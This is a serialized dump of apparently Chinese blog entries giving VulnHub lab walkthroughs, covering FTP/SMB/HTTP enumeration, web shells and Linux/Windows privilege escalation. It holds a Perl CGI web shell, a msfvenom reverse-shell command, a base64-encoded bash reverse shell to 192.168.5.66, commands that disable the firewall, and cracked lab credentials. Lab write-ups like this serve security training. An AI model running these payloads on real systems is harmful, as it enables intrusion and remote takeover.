关闭防火墙：\nnet stop sharedaccess\rsc config sharedaccess status= disable 上传nc.exe，反弹shell：\n提权 windows单机提权确实比较少：\ntasklist /V查看进程信息：\nnet start查看服务列表：\ndir /s | findstr \u0026ldquo;FileZilla server.exe\u0026rdquo;\n查询FileZilla server.exe文件：\n生成木马，上传：\n这种格式的木马可以直接用NC监听：\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.5.66 LPORT=8889 -f exe \u0026gt; reverse_sys_tcpshell.exe 记得改成binary\n停止服务：\nnet stop \u0026ldquo;FileZilla Server FTP server\u0026rdquo;\n覆盖服务：\n开启监听，然后启动服务：\nnet start \u0026ldquo;FileZilla Server FTP server\u0026rdquo;\n运行不了whoami，只能通过这种进程的方式来证明权限：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x076-dev-randomscream/","summary":"\u003cp\u003e头一次打vulnhub的windows靶机，不太好配置啊：\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE87c4b538a137954d0474da79f0056849image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa7bae8babbd95b78240e721eb612bd8bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e先看FTP：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9be74f55b58760de31ce413d42cca90aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e文件挺多的，但是都没读取权限：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9ecabaa1a20e5ca5f13be81ccd76b31fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口也没扫出东西，这个root可能是80端口，然后看一下UPD的TFTP：\u003c/p\u003e\n\u003cp\u003e随便尝试了一下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE448020f7c8cf5c4aea20af6e81095a10image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是php反弹shell失败了，可能没有PHP的环境：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6c4c7f225f482364f45c161a3fa3ca44image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里查了一些资料，cgi程序：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE00273facdd56f5b7ef383221571d8e06image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEff2c4b45f24113084178074905020a9cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这些语言都可以实现，然后，poc如下：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003euse CGI;\r\nuse Cwd;\r\nprint CGI::header( -type =\u0026gt; \u0026#39;text/html\u0026#39; );\r\nmy $command = CGI::param(\u0026#39;command\u0026#39;);\r\nmy $pwd = CGI::param(\u0026#39;pwd\u0026#39;) || \u0026#39;\u0026#39;;\r\nmy $password = CGI::param(\u0026#39;password\u0026#39;);\r\nmy $filename = CGI-\u0026gt;script_name() ;\r\n\r\nif ( $password ne \u0026#39;yourpassword\u0026#39; ) {\r\n    print \u0026#34;Please provide a valid password.\\n\u0026#34;;\r\n    exit(0)\r\n}\r\n\r\n$pwd = $pwd eq \u0026#39;\u0026#39; ? `pwd` : $pwd;\r\nmy $home = Cwd::cwd();\r\nchdir($pwd);\r\n\r\nmy $result=\u0026#39;\u0026#39;;\r\n\r\nif ($command =~ /^cd\\s*(.*)/) {\r\n  my $dir = $1 or \u0026#39;\u0026#39;;\r\n  if ($dir eq \u0026#39;\u0026#39;) {\r\n    chdir($home);\r\n  } else {\r\n    chdir($dir);\r\n  }\r\n  $pwd = Cwd::cwd(); \r\n  $result = `ls -la`;\r\n} else {\r\n  $result = `$command`;\r\n}\r\n\r\nprint \u0026lt;\u0026lt;EOF;\r\n\u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt;\r\n\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\r\n\u0026lt;meta content=\u0026#34;text/html; charset=ISO-8859-1\u0026#34; http-equiv=\u0026#34;content-type\u0026#34;\u0026gt;\u0026lt;title\u0026gt;console\u0026lt;/title\u0026gt;\r\n\u0026lt;script\u0026gt;\r\nwindow.onload = function(){\r\n        document.getElementById(\u0026#34;command\u0026#34;).focus();\r\n        }\r\n\r\n\u0026lt;/script\u0026gt;\r\n\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;\r\n.wide1 {\r\nborder-width: thick;\r\nwidth: 100%;\r\nheight: 600px;\r\n}\r\n.wide2 {\r\nsetFocus;\r\nborder-width: thick;\r\nwidth: 100%;\r\n}\r\n\u0026lt;/style\u0026gt;\r\n\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\r\n\u0026lt;p\u0026gt;\r\nScript: $filename PWD: $pwd \u0026lt;br/\u0026gt;\r\n\u0026lt;textarea class=\u0026#34;wide1\u0026#34; readonly=\u0026#34;readonly\u0026#34; cols=\u0026#34;1\u0026#34; rows=\u0026#34;1\u0026#34; name=\u0026#34;result\u0026#34;\u0026gt;\r\n$result\r\n\u0026lt;/textarea\u0026gt;\u0026lt;/p\u0026gt;\r\n\u0026lt;form method=\u0026#34;get\u0026#34; action=\u0026#34;$filename\u0026#34; name=\u0026#34;command\u0026#34;\u0026gt;Command:\u0026amp;nbsp;\r\n\u0026lt;input class=\u0026#34;wide2\u0026#34; name=\u0026#34;command\u0026#34; id=\u0026#34;command\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\r\n\u0026lt;input name=\u0026#34;password\u0026#34; value=\u0026#34;$password\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt;\r\n\u0026lt;input name=\u0026#34;pwd\u0026#34; value=\u0026#34;$pwd\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt;\r\n\u0026lt;/form\u0026gt;\r\n\u0026lt;br\u0026gt;\r\n\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\r\nEOF\r\n\r\nexit 0;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e使用方式：\u003c/p\u003e","title":"0x076 dev randomscream"},{"content":"端口扫描 渗透测试 SMBA没有东西，那么就是HTTP 8080了：\n解密出来：\nIt\u0026rsquo;s annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.\nOnce, we found the password \u0026ldquo;password\u0026rdquo;, quite literally sticking on a post-it in front of an employee\u0026rsquo;s desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.\nNo fluffy bunnies for those who set insecure passwords and endanger the enterprise.\n这里说有默认密码：\n这里有几个思路，一个是smb，一个tomcat的弱密码，tomcat简单试了一下，password是不行的，那就是smb了，用enum4linux扫描一下：\n登录成功：\n看目录，应该是家目录了，但是没有开ssh，只能寻找其他路子：\n发现隐藏目录：\n可以开启HTTP和SSH：\n把ssh和80开启来：\n记录一下，指定用户名的smb挂载：\nsudo mount -t cifs -o username=\u0026#34;qiu\u0026#34;,password=\u0026#34;password\u0026#34; //192.168.5.103/qiu smb 当前目录没有写入ssh的权限，可能要看看80了：\n搜索漏洞：\n文件读取，那么剩下的路就是读取有用信息了，我这里有几个想法：1、读取smb扫出来的另外一个用户的key；2、读取数据库密码；3、读取tomcat的密码。\n第一个尝试，失败了，第二个不知道路径，第三个读取成功：\n\u0026ldquo;thisisasuperduperlonguser\u0026rdquo; password=\u0026ldquo;heartbreakisinevitable\u0026rdquo;\n\u0026ldquo;fluffy\u0026rdquo; password=\u0026ldquo;freakishfluffybunny\u0026rdquo;\n后面就是部署war包getshell了：\nmsfvenom生成shell的大全：\nhttps://blog.csdn.net/Sagittarius32/article/details/125779426\n打包jsp文件：\njar -cvf webshell.war shell.jsp kali的原生环境java可能有些问题：\n提权 经过测试，qiu和fluffy都是可以登录的吗，但是也都没有sudo权限：\n发现疑似提示：\n发现有趣的东西了：\n这个地方的这个内容，其实和我们在web目录中的内容一致：\n所以有理由猜测，这个脚本是控制这个内容输出的，把这个内容添加反弹shel脚本：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x077-digitalworld.localmercyv2/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE74f817d050008763895c9aeeadb1bc6fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE76d1c146ffa9dc152a48b68a0cc29489image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透测试\"\u003e渗透测试\u003c/h1\u003e\n\u003cp\u003eSMBA没有东西，那么就是HTTP 8080了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3f77b34b64dd6df5c8b8ba2932aec50fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe072604120ca403c1f374a964aad5940image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e解密出来：\u003c/p\u003e\n\u003cp\u003eIt\u0026rsquo;s annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.\u003c/p\u003e\n\u003cp\u003eOnce, we found the password \u0026ldquo;password\u0026rdquo;, quite literally sticking on a post-it in front of an employee\u0026rsquo;s desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.\u003c/p\u003e","title":"0x077 Digitalworld.local(Mercyv2)"},{"content":"端口扫描 渗透 FTP：\n这里有几个信息，1337端口？nitish81299、nitu:81299\nHTTP：\n命令执行：\n用burp抓包可以发现是个重定向：\n反弹shell，弹了半天，弹不动，后面看了一下，这里是过滤了，得用base64绕过：\necho \u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==\u0026#34; | base64 -d | bash 提权 发现SUID，不过不是root的，并且没有执行权限，看样子得提权到nitish才行：\n然后在nitish的家目录下面找到密码：\nnitish:p4ssw0rdStr3r0n9\n切换到sam用户，用gtfobin的方法，这里都执行失败了，\n这里又有一个坑，使用-h看到的参数里面都没法执行成功：\n但是man可以：\n然后就是，随便带一个参数就可以提权：\nsudo提权这里不知道怎么利用：\n去sam家目录下面翻查，有一个.pyc的文件：\n传出来：\n反编译：\nhttps://tool.lu/pyc/\n#!/usr/bin/env python\r# visit https://tool.lu/pyc/ for more information\r# Version: Python 2.7\rfrom getpass import getuser\rfrom os import system\rfrom random import randint\rdef naughtyboi():\rprint \u0026#39;Working on it!! \u0026#39;\rdef guessit():\rnum = randint(1, 101)\rprint \u0026#39;Choose a number between 1 to 100: \u0026#39;\rs = input(\u0026#39;Enter your number: \u0026#39;)\rif s == num:\rsystem(\u0026#39;/bin/sh\u0026#39;)\relse:\rprint \u0026#39;Better Luck next time\u0026#39;\rdef readfiles():\ruser = getuser()\rpath = input(\u0026#39;Enter the full of the file to read: \u0026#39;)\rprint \u0026#39;User %s is not allowed to read %s\u0026#39; % (user, path)\rdef options():\rprint \u0026#39;What do you want to do ?\u0026#39;\rprint \u0026#39;1 - Be naughty\u0026#39;\rprint \u0026#39;2 - Guess the number\u0026#39;\rprint \u0026#39;3 - Read some damn files\u0026#39;\rprint \u0026#39;4 - Work\u0026#39;\rchoice = int(input(\u0026#39;Enter your choice: \u0026#39;))\rreturn choice\rdef main(op):\rif op == 1:\rnaughtyboi()\relif op == 2:\rguessit()\relif op == 3:\rreadfiles()\relif op == 4:\rprint \u0026#39;work your ass off!!\u0026#39;\relse:\rprint \u0026#39;Do something better with your life\u0026#39;\rif __name__ == \u0026#39;__main__\u0026#39;:\rmain(options()) 大概看一下，可以知道整个逻辑，当输入的内容等于num的时候，执行/bin/sh，那么这里其实理论上运气足够好，或者写个脚本一直怼着一个数字跑，应该是可以直接拿到shell的，但是这种方法明显不靠谱，在这里python2中，\n2021-4034秒了：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x078-djinn1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE32d366749858f384b258b752e94a4555image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8bff7a9e9a70b6b4389424a5314dc4a1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcaa498add233ae75057ecb27b2f7af48image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003eFTP：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9c508adcba3bbe67f5ba8672f778cbedimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里有几个信息，1337端口？nitish81299、nitu:81299\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE28cf9501e1386257869e0ecc2dfe189cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eHTTP：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE56c3137b5f4bf4648827e8f7fc6c033bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e命令执行：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE008cfbe77d712786215abc017467fb64image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf52666b561ae6d53df6e1b04f1302739image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用burp抓包可以发现是个重定向：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE94786b2ab29c9817b29c1a8d95408c20image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e反弹shell，弹了半天，弹不动，后面看了一下，这里是过滤了，得用base64绕过：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eecho \u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==\u0026#34; | base64 -d | bash\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdbaf6d5b9c645fda8da1e122548ce48fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd574aa49ef46874eac356a3cf4f63212image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现SUID，不过不是root的，并且没有执行权限，看样子得提权到nitish才行：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE236e0ff3dba9d9a66f092e7de1b11d8dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后在nitish的家目录下面找到密码：\u003c/p\u003e\n\u003cp\u003enitish:p4ssw0rdStr3r0n9\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7ca081e0461a31522c964c593daf591dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e切换到sam用户，用gtfobin的方法，这里都执行失败了，\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc683522e6f1484e907b650a8a9fb899fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里又有一个坑，使用-h看到的参数里面都没法执行成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5222747087bbc5564aba2b847411d9eaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是man可以：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0d9988f2265199aee2a8203785458e5fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后就是，随便带一个参数就可以提权：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE61dfb0f6d86c449c7b8a46afa28a7c6cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esudo提权这里不知道怎么利用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc5d855c8b22f37d0f91a1fac4fd2cd5aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e去sam家目录下面翻查，有一个.pyc的文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE73196c0a316200d848a11d085ec09e94image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e传出来：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE95edb9c1f70249eea6a045d446210497image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE63440625801c3d345ed09e410426e479image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e反编译：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.lu/pyc/\"\u003ehttps://tool.lu/pyc/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5ef5e9e34de05e7716a88837f112d19cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x078 Djinn1"},{"content":"端口扫描 渗透 smb:\nhttp：\nurl编码后，直接反弹shell:\n提权 根据描述来看，这个靶机主要就是看的提权：\n有GCC，先秒了再说：\nNFS提权：\n挂载：\n复制bash:\n给suid权限：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x079-escalate_linux1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb55240db28b2e77a57f5f3151ea17adaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE35991696c3607edd690bb5defd09f925image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003esmb:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf97b1254f7dfaffb6398df2db386d488image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ehttp：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb086601261df6d310d3c93c94e5c0b79image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE387357b46fadc32fe608557307cc945eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eurl编码后，直接反弹shell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE61dca625e919722f12a86e4f105f23e0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e根据描述来看，这个靶机主要就是看的提权：\u003c/p\u003e\n\u003cp\u003e有GCC，先秒了再说：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdf6440643a53d1b889f6f942d89d531dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eNFS提权：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7ea76102c0a0cc932b010ce7994b3865image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e挂载：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcbae99cfb08649110d01e9737809be5aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e复制bash:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf2fcd1f0f1985c93ac9d89b0c0ccc2edimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4bc21032b0ade087bef445dfab4984ceimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e给suid权限：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE527e2705a41a0115d43618593b91760dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb492d226b2b3c0d82fa5f9d26c4ceb70image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x079 Escalate_Linux1"},{"content":"看描述，要改mac地址：\n渗透 邪门儿，意思是说，这个页面的drink fristi的意思是，让我们看这个目录：\n把上面的base64替换掉，然后浏览器访问，搞出来是这个样子：\nkeKkeKKeKKeKkEkkEk\nadmin不对：\n但是eezeepz可以：\n随后是文件上传，能上传shell,jpg但是没有文件包含：\n呐应该是可以绕过，比较老生常谈的apache 解析漏洞：\n提权 在eezeepz的家目录下面发现了这样一句话：\n计划任务：\n然后，这里可以知道提示的原因是啥了：\n然后仔细看了一下，这些个命令，看看有啥能用的，其实我是想要创造一个属于admin用户的suid文件，然后提权的，但是试了半天没成功，看看网上的思路，是把admin用户的目录给777了：\n然后看了一下：\n这里面没有那么多命令，比图touch等，但是echo 和chmod有：\n改一下脚本内容：\n需要先用admin用户创建一个所有人可读可写的cxk文件：\n用当前用户修改cxk的内容为bash:\n重新写一个u+s权限即可：\n切换成admin了：\ndamin目录下：\n看样子是需要解密这串密文，还是比较好理解的，先是base64，然后rot13，想办法解开即可，这代码不难，只需要把en改成de即可：\nsudo -l:\n这里尝试后，就知道，作者这里在提示了：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x080-fristileaks1.3/","summary":"\u003cp\u003e看描述，要改mac地址：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7cbcb733e1b1ee42b8d53ada55ff0c14image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE22cdc31d77af424071b51844e6dc9141image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e邪门儿，意思是说，这个页面的drink fristi的意思是，让我们看这个目录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE65c8ce50c1eab3d9279d86dbc8b47767image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE00711889079ee7e4c9741a0adee9e51dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e把上面的base64替换掉，然后浏览器访问，搞出来是这个样子：\u003c/p\u003e\n\u003cp\u003ekeKkeKKeKKeKkEkkEk\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc79b22f8f077ee98fb42f631fa0e7dd0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eadmin不对：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE98303ddf7e04a91fc86195d5f496e617image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是eezeepz可以：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0675063cfe06ab5933de6b18d090b2b1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e随后是文件上传，能上传shell,jpg但是没有文件包含：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4b9331c91a97b1f942286d5515ecaac2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e呐应该是可以绕过，比较老生常谈的apache 解析漏洞：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfddf28994a9b7122fe89c05508bac2f2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE46dd7f085d3897b40b7f572a1251f847image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e在eezeepz的家目录下面发现了这样一句话：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa068681661dd102587820abb194a3520image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e计划任务：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9c40374329eefd3c82252362bc537fa6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后，这里可以知道提示的原因是啥了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa81f153d8cbee3660747b9236e5905c2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后仔细看了一下，这些个命令，看看有啥能用的，其实我是想要创造一个属于admin用户的suid文件，然后提权的，但是试了半天没成功，看看网上的思路，是把admin用户的目录给777了：\u003c/p\u003e\n\u003cp\u003e然后看了一下：\u003c/p\u003e\n\u003cp\u003e这里面没有那么多命令，比图touch等，但是echo 和chmod有：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc3d83a01ccb4ac445f78281e18dba99eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e改一下脚本内容：\u003c/p\u003e\n\u003cp\u003e需要先用admin用户创建一个所有人可读可写的cxk文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE67ad04eea8620e72fc19b6969f6e9af3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用当前用户修改cxk的内容为bash:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc9afa68897e0499c8a70f58b0675c429image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e重新写一个u+s权限即可：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEedd0bb03c921141f29f1c0fc7a04503aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEec93b43361685d7037a470fab09917c8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e切换成admin了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" 